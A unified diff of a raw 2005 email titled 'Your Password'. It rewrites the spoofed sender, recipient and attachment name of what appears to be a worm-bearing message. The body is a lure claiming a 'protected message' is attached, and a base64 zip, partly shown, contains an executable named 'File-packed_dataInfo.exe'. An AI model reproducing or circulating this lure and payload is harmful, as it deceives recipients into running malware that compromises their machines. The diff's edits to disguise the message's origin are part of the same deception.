@@ -1,29 +1,29 @@
-From: postman@2b.qb.sgi.com
-Subject: Your_Password
-Date: Tue, 20 Dec 2005 18:56:22 UTC
-Message-ID: <22eaa6706ba4af5325b5@oss.sgi.com>
+From: Admin@rowland.org
+Subject: Your Password
+Date: Tue, 20 Dec 2005 20:31:36 GMT
+Message-ID: <bca2f.caadc7ebc3@ycrxx.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="==342d43.029dba3f"
+Content-Type: multipart/mixed; boundary="===16f0659458c371.fd"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: netdev@oss.sgi.com
+To: e-user@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---==342d43.029dba3f
+--===16f0659458c371.fd
 
 Protected message is attached!
 
 
-***** Go to: http://www.2b.qb
-***** Email: postman@2b.qb
---==342d43.029dba3f
-Content-Type: application/octet-stream; name=reg_pass.zip
+***** Go to: http://www.rowland.org
+***** Email: postman@rowland.org
+--===16f0659458c371.fd
+Content-Type: application/octet-stream; name=reg_pass-data.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass.zip"
+Content-Disposition: attachment; filename="reg_pass-data.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---==342d43.029dba3f--
+--===16f0659458c371.fd--
